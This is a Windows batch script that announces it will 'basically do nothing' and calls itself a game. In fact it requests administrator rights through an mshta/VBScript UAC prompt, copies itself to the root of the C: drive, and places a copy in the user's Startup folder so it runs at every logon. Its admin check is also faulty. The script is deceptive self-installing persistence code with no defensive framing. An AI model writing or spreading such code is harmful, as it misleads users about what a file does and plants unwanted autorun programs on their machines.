@echo off
cls
echo.
echo This script will:
echo 1. Basically do nothing.
echo 2. and thats it
echo.

:: Check for admin rights
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Requesting Administrator privileges...
    goto UACPrompt
)

:UACPrompt
if '%1'=='RightClick' goto SkipUAC
mshta vbscript:createobject("shell.application").shellexecute("%~s0","RightClick","","runas",1)(window.close)
exit /b

:SkipUAC

:: Set variables
set "source=%~f0"
set "filename=%~nx0"
set "dest=C:\%filename%"

:: Copy to C:\
copy /y "%source%" "%dest%"
if errorlevel 1 (
    echo error game couldnt upload onto c drive.
) else (
    echo Game successfully copied to C:\
)

:: Copy to Startup Folder
set "startup=%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\%filename%"
echo.
copy /y "%source%" "%startup%"
if errorlevel 1 (
    echo uh ohs
) else (
    echo hehe
)

echo.
echo rah
echo - lorem
echo - ok
pause